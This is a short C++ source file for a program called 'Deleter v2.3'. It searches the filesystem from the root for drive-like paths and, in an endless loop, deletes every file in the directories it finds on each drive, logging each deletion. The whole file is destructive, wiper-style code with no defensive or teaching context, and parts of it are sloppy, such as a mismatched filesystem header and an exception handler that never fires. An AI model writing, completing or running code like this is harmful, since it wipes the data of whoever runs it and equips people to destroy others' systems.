#include <experimental/filesystem>
#include <iostream>
#include <string>
#include <vector>
using namespace std;
using namespace std::filesystem;
int DeleterMain() {
    string Title = "Deleter v2.3";
    cout << Title << endl;
    vector<path> Disks; // Declare an empty vector
    while (true) {
      for (const directory_entry &root : recursive_directory_iterator(
               std::filesystem::current_path()
                   .root_directory())) {
        if (root.path().parent_path() != root.path() &&
            root.path().string().length() <= 3) {
          cout << "Possible Root Directory: " << root.path() << endl;
          Disks.push_back(root.path());
        }
        std::vector<std::string> drives;
        for (const path &disk : Disks) {
          drives.push_back(disk.string());
        }
        // Iterate through the split drives
        for (const std::string &drive : drives) {
          std::vector<path> dirs;
          for (const directory_entry &entry :
               std::filesystem::directory_iterator(drive)) {
            dirs.push_back(entry.path());
          }
          for (const path &dir : dirs) {
            if (is_directory(dir)) {
              std::vector<path> files;
              for (const directory_entry &file :
                   std::filesystem::directory_iterator(dir)) {
                files.push_back(file.path());
              }
              for (const path &file : files) {
                cout << "Deleting " << file << endl;
                try {
                  std::error_code ec;
                  remove(file, ec);
                } catch (exception e) {
                  std::cerr << "Error deleting file: " << e.what() << std::endl;
                }
              }
            }
          }
        }
      }
    }
}
